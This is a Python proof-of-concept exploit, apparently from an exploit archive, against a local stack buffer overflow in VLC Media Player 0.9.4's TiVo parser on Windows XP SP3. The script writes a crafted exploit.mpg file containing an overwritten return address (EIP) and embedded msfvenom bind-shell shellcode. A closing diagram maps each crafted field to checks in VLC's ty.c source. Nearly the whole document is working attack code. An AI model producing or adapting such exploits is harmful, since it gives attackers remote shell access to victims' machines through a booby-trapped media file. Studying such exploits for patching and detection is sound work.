"""
Full title:	VideoLAN VLC Media Player 0.9.4 TIVO Local Stack Buffer Overflow
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com (Based on the original work of Guido Landi)
Vendor Homepage:	https://www.videolan.org
Version:	VideoLAN VLC Media Player 0.9.4
Tested on:	Windows XP SP3
Category:	local exploits
Platform:	windows
"""

#!/usr/bin/python
EIP = "\x78\x6A\x83\x7C" #Address=7C836A78  call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6532 (C:\WINDOWS\system32\kernel32.dll)

junk = "\x90"
#msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00"
shellcode=("\xba\x55\x49\x66\xbf\xdb\xd2\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x53\x83\xc0\x04\x31\x50\x0e\x03\x05\x47\x84\x4a\x59\xbf\xca"
"\xb5\xa1\x40\xab\x3c\x44\x71\xeb\x5b\x0d\x22\xdb\x28\x43\xcf"
"\x90\x7d\x77\x44\xd4\xa9\x78\xed\x53\x8c\xb7\xee\xc8\xec\xd6"
"\x6c\x13\x21\x38\x4c\xdc\x34\x39\x89\x01\xb4\x6b\x42\x4d\x6b"
"\x9b\xe7\x1b\xb0\x10\xbb\x8a\xb0\xc5\x0c\xac\x91\x58\x06\xf7"
"\x31\x5b\xcb\x83\x7b\x43\x08\xa9\x32\xf8\xfa\x45\xc5\x28\x33"
"\xa5\x6a\x15\xfb\x54\x72\x52\x3c\x87\x01\xaa\x3e\x3a\x12\x69"
"\x3c\xe0\x97\x69\xe6\x63\x0f\x55\x16\xa7\xd6\x1e\x14\x0c\x9c"
"\x78\x39\x93\x71\xf3\x45\x18\x74\xd3\xcf\x5a\x53\xf7\x94\x39"
"\xfa\xae\x70\xef\x03\xb0\xda\x50\xa6\xbb\xf7\x85\xdb\xe6\x9f"
"\x6a\xd6\x18\x60\xe5\x61\x6b\x52\xaa\xd9\xe3\xde\x23\xc4\xf4"
"\x21\x1e\xb0\x6a\xdc\xa1\xc1\xa3\x1b\xf5\x91\xdb\x8a\x76\x7a"
"\x1b\x32\xa3\x17\x13\x95\x1c\x0a\xde\x65\xcd\x8a\x70\x0e\x07"
"\x05\xaf\x2e\x28\xcf\xd8\xc7\xd5\xf0\xf7\x4b\x53\x16\x9d\x63"
"\x35\x80\x09\x46\x62\x19\xae\xb9\x40\x31\x58\xf1\x82\x86\x67"
"\x02\x81\xa0\xff\x89\xc6\x74\x1e\x8e\xc2\xdc\x77\x19\x98\x8c"
"\x3a\xbb\x9d\x84\xac\x58\x0f\x43\x2c\x16\x2c\xdc\x7b\x7f\x82"
"\x15\xe9\x6d\xbd\x8f\x0f\x6c\x5b\xf7\x8b\xab\x98\xf6\x12\x39"
"\xa4\xdc\x04\x87\x25\x59\x70\x57\x70\x37\x2e\x11\x2a\xf9\x98"
"\xcb\x81\x53\x4c\x8d\xe9\x63\x0a\x92\x27\x12\xf2\x23\x9e\x63"
"\x0d\x8b\x76\x64\x76\xf1\xe6\x8b\xad\xb1\x17\xc6\xef\x90\xbf"
"\x8f\x7a\xa1\xdd\x2f\x51\xe6\xdb\xb3\x53\x97\x1f\xab\x16\x92"
"\x64\x6b\xcb\xee\xf5\x1e\xeb\x5d\xf5\x0a")
file=open("exploit.mpg","wb")
file.write("\xF5\x46\x7A\xBD" + "\x00\x00\x00\x02" + "\x00\x02\x00\x00" + (junk * 8) + "\x00\x00\x05\x41" + (junk * 4) + "\x00\x00\x05\x49" + (junk * 60) + EIP + (junk*60)+shellcode+(junk * (130976-len(shellcode)-60)) + "\x05" + (junk * 3) + "\x05" + (junk * 1) + "\x09" + "\xc0" + (junk * 14) + "\x06" + "\xe0" + (junk * 531062))
file.close()
"""
--------------------------------------------------------
|		ty.c #112 TIVO_PES_FILEID 0xf5467abd			| 
--------------------------------------------------------
|		ty.c #113 TIVO_PART_LENGTH 0x20000000			|
--------------------------------------------------------
|		ty.c #114 CHUNK_SIZE	128 * 1024				|
--------------------------------------------------------
|		junk * 8										|
--------------------------------------------------------
|		i_map_size										|
--------------------------------------------------------
|		junk * 4										|
--------------------------------------------------------
|		ty.c # 1654 i_seq_table_size/(8+i_map_size)== 1	|
--------------------------------------------------------
|		junk * 60										|
--------------------------------------------------------
|		EIP												|
--------------------------------------------------------
|		big junk * 130976  (shellcode can fit here )	|
--------------------------------------------------------
|		ty.c #1743 i_num_recs must be greater than 5	|
--------------------------------------------------------
|		junk * 3										|
--------------------------------------------------------
|		p_hdrs (x05)									|
--------------------------------------------------------
|		junk * 1										|
--------------------------------------------------------
|		ty.c #1763 rec_type == 0x9c0 -> AC-3DTivo		|
|		subrec_type	(x09)								|
|		rec_type (xc0)									|
--------------------------------------------------------
|		junk * 14										|
--------------------------------------------------------
|		video type rec_type == 0x6e0 -> S1 Tivo			|
|		subrec_type (x06)								|
|		rec_type (xe0)									|
--------------------------------------------------------
|		big junk x 531062								|
--------------------------------------------------------
"""